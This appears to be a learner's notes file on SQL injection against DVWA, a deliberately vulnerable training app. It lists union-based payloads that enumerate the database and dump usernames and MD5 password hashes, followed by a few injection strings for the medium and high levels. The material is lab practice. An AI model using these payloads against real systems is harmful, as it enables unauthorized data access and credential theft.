# DVWA
## SQL Injection
### Level Low
```sql
' or 1=1 # --Test ok
' order by 5 # --Test failed
' order by 3 # --Test Falied
' order by 2 # --Test Success
' or 1=1 order by 2 # --Get all data success.
' union select version(),current_user() # --Get version is 5.7.30 and current user is dvwa@localhost
' union select database(),2 # --Get database name is dvwa
' union select @@basedir,2 # --Get basedir is /usr/
' union select table_name,2 from information_schema.tables where table_schema='dvwa' # --Get table name has guestbook, users
' union select column_name,2 from information_schema.columns where table_schema='dvwa' and table_name='users' # --Get users table columns has user_id,first_name,last_name,user,password,avatar,last_login,failed_login
' union select count(*),2 from users # --Get rows is 5
' union select user,password from user # --Get user and password success
  -- ID: ' union select user,password from users #
  -- First name: admin
  -- Surname: 5f4dcc3b5aa765d61d8327deb882cf99
  -- ID: ' union select user,password from users #
  -- First name: gordonb
  -- Surname: e99a18c428cb38d5f260853678922e03
  -- ID: ' union select user,password from users #
  -- First name: 1337
  -- Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
  -- ID: ' union select user,password from users #
  -- First name: pablo
  -- Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
  -- ID: ' union select user,password from users #
  -- First name: smithy
  -- Surname: 5f4dcc3b5aa765d61d8327deb882cf99
```
### Level Medium Security
```sql
-- Use Burp Suite change post data
id=1' and 1=1%23
id=1' ordery by 2%23
id=1' union select 1,2%23
```

### Level High Security
```sql
1' and 1=1#
1' and 1=2#
# You can see error means wo can inject sql here :P
```
